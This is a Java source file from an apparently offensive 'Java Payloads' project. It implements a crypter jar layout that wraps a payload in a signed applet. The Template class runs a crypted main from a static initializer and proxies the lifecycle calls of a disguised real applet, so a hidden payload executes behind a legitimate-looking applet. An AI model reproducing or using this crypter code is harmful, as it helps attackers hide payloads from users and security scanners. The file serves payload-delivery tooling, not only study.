/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.crypter;

import java.applet.Applet;
import java.applet.AppletStub;
import java.util.jar.Manifest;

import javapayload.Parameter;

public class SignedApplet extends TemplateBasedJarLayout {

	public SignedApplet() {
		super("Signed Applet Jar", Template.class,
				"Use this jar layout with Jar files that contain a signed Java applet.");
	}

	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("APPLETCLASS", false, Parameter.TYPE_ANY, "Name of the applet class"),
				new Parameter("NEWAPPLETCLASS", false, Parameter.TYPE_ANY, "Name of the new (generated) applet class"),
		};
	}

	public void init(String[] parameters, Manifest manifest) throws Exception {
		targetClassName = parameters[0];
		stubClassName = parameters[1];
	}

	public static class Template extends Applet implements AppletStub {

		public static Class target;

		static {
			if (!"TARGET_CLASS_NAME".endsWith("_NAME"))
				TemplateBasedJarLayout.cryptedMain(new String[] { "TARGET_CLASS_NAME", "STUB_CLASS_NAME", "target" });
		}

		private Applet realApplet;

		public Template() {
			try {
				realApplet = (Applet) target.newInstance();
			} catch (Exception ex) {
				/* #JDK1.4 */try {
					throw new RuntimeException(ex);
				} catch (NoSuchMethodError ex2) /**/{
					throw new RuntimeException(ex.toString());
				}
			}
			realApplet.setStub(this);
		}

		public void init() {
			realApplet.init();
		}

		public void start() {
			realApplet.start();
		}

		public void stop() {
			realApplet.stop();
		}

		public void destroy() {
			realApplet.destroy();
		}

		public void appletResize(int width, int height) {
			resize(width, height);
		}
	}
}
